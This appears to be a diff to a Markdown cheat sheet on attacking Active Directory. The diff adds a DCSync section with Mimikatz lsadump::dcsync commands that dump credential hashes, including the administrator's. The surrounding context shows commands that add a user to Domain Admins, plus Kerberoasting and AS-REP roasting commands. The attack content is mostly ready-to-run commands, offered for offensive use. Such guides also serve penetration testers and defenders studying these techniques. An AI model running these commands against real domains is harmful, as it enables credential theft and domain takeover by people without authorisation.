@@ -49,7 +49,7 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
         ```powershell
         Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
         ```
-        
+
 #### On a Computer
 - **Resource-Based Constrained Delegation (RBCD)**
 
@@ -104,8 +104,11 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
     $ADSI.psbase.commitchanges()
     ```
 
-
 ### DCSync Attack
+    ```powershell
+	lsadump::dcsync /domain:<Domain> /user:<User>
+	lsadump::dcsync /domain:example.com /user:administrator
+    ```
 
 ## Kerberoasting
 Kerberoasting targets accounts with Kerberos service tickets by exploiting service principal names (SPNs) and cracking the tickets offline.
@@ -137,3 +140,5 @@ Find accounts without Kerberos preauthentication and request an AS-REP hash for 
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 Invoke-ASREPRoast -Verbose
+```
+
